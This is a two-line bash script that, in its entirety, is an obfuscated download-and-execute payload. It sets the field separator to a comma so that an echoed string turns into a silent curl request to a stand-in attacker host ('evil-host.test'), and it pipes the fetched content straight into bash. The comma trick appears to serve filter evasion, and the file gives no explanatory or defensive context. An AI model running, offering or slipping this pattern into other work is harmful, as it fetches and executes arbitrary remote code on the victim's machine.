#!/bin/bash
IFS=,;$(echo curl,-s,http://evil-host.test/p)|bash
